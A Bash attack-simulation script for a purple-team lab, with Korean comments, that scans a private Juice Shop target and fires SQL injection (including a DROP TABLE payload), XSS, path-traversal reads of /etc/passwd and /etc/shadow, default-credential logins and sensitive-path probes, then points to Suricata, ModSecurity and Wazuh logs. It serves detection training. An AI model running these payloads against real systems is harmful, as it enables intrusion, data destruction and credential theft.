#!/bin/bash
# =============================================================================
# Purple Team Lab - 공격 테스트 스크립트
# Agent VM에서 실행 - 다양한 웹 취약점 공격을 시뮬레이션합니다.
# 교육 목적 전용
# =============================================================================

TARGET="http://10.10.10.80"
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║      Purple Team Lab - Attack Simulation             ║${NC}"
echo -e "${CYAN}║      Target: ${TARGET}                     ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════════════╝${NC}"
echo ""
echo "시작 시간: $TIMESTAMP"
echo ""

command -v curl &>/dev/null || sudo apt-get install -y curl
command -v nmap &>/dev/null || sudo apt-get install -y nmap

# ─────────────────────────────────────
# 1. 포트 스캔
# ─────────────────────────────────────
echo -e "${YELLOW}[1/7] Nmap 포트 스캔${NC}"
nmap -sV --open -T4 10.10.10.80 2>/dev/null | grep -E "(open|service)" | head -10
echo ""

# ─────────────────────────────────────
# 2. 기본 접근
# ─────────────────────────────────────
echo -e "${YELLOW}[2/7] 기본 HTTP 접근${NC}"
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/")
echo "GET /  →  HTTP $CODE"
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/Products")
echo "GET /api/Products  →  HTTP $CODE"
echo ""

# ─────────────────────────────────────
# 3. SQL Injection
# ─────────────────────────────────────
echo -e "${YELLOW}[3/7] SQL Injection 테스트${NC}"
payloads=(
    "' OR '1'='1"
    "')) OR 1=1--"
    "'; DROP TABLE users;--"
    "1 UNION SELECT * FROM users--"
)
for payload in "${payloads[@]}"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/rest/products/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")")
    echo "SQLi: ${payload:0:30}...  →  HTTP $CODE"
done
echo ""

# ─────────────────────────────────────
# 4. XSS (Cross-Site Scripting)
# ─────────────────────────────────────
echo -e "${YELLOW}[4/7] XSS 테스트${NC}"
xss_payloads=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert(1)>"
    "javascript:alert(document.cookie)"
    "<svg onload=alert(1)>"
)
for payload in "${xss_payloads[@]}"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/?q=$payload")
    echo "XSS: ${payload:0:35}  →  HTTP $CODE"
done
echo ""

# ─────────────────────────────────────
# 5. Path Traversal
# ─────────────────────────────────────
echo -e "${YELLOW}[5/7] Path Traversal 테스트${NC}"
paths=(
    "/../../../etc/passwd"
    "/../../../../etc/shadow"
    "/%2e%2e%2f%2e%2e%2fetc/passwd"
    "/.env"
    "/config.json"
)
for path in "${paths[@]}"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$path")
    echo "Path: $path  →  HTTP $CODE"
done
echo ""

# ─────────────────────────────────────
# 6. 인증 우회
# ─────────────────────────────────────
echo -e "${YELLOW}[6/7] 인증 우회 테스트${NC}"
# Admin 로그인 시도 (Juice Shop)
CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/rest/user/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"admin123"}')
echo "Admin login attempt  →  HTTP $CODE"

# JWT 없이 관리자 API 접근
CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/Users")
echo "Users API (no auth)  →  HTTP $CODE"
echo ""

# ─────────────────────────────────────
# 7. 민감 정보 노출
# ─────────────────────────────────────
echo -e "${YELLOW}[7/7] 민감 정보 노출 테스트${NC}"
sensitive_paths=(
    "/ftp/"
    "/backup/"
    "/.git/"
    "/package.json"
    "/swagger.json"
    "/metrics"
)
for path in "${sensitive_paths[@]}"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$path")
    if [ "$CODE" == "200" ] || [ "$CODE" == "301" ]; then
        echo -e "${RED}FOUND${NC}: $path  →  HTTP $CODE"
    else
        echo "NOT FOUND: $path  →  HTTP $CODE"
    fi
done
echo ""

# ─────────────────────────────────────
# 결과 요약
# ─────────────────────────────────────
echo -e "${CYAN}══════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}공격 테스트 완료${NC}"
echo ""
echo "탐지 결과 확인:"
echo "  Suricata:     ssh security@192.168.193.131 'sudo tail -f /var/log/suricata/fast.log'"
echo "  ModSecurity:  ssh web@192.168.193.130 'sudo tail -f /var/log/apache2/modsec_audit.log'"
echo "  Wazuh:        https://192.168.193.132/ (admin으로 로그인)"
echo ""
